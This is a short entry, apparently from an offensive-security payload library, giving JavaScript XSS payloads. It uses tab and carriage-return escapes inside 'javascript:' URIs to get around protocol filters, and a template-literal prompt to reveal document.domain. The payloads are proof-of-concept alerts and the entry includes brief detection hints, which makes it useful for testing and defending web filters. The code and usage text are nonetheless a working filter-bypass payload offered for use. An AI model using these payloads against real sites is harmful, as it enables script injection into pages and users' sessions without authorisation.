---
id: ff905756-edd9-4ccf-8fb8-729b69241277
type: code
language: JavaScript
verified: true
created_at: '2023-04-06T03:56:42.768563+00:00'
updated_at: '2023-04-10T20:21:46.075934+00:00'
tags:
  - xss
  - uri-bypass
  - escapes
platforms:
  - Web
  - Browser
validated: true
---

# XSS-Javascript-URI-Bypass-Using-Escapes

## Code

```javascript
prompt`${document.domain}`
document.location='java\tscript:alert(1)'
document.location='java\rscript:alert(1)'
document.location='java\tscript:alert(1)'
```

## Description

Uses template literals for domain prompt and escaped javascript: URIs (with \t and \r) to redirect and execute alert, bypassing URI protocol filters.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| 1 | Alert argument | 1 |

## Usage

Execute to confirm domain and trigger alerts via location changes; effective against incomplete URI sanitization.

## Detection

- Suspicious location assignments with escapes.
- Prompt calls revealing domain in XSS contexts.

## Related

- [[procedures/Bypass-XSS-Alert-Filter-Using-Alternate-Functions]]
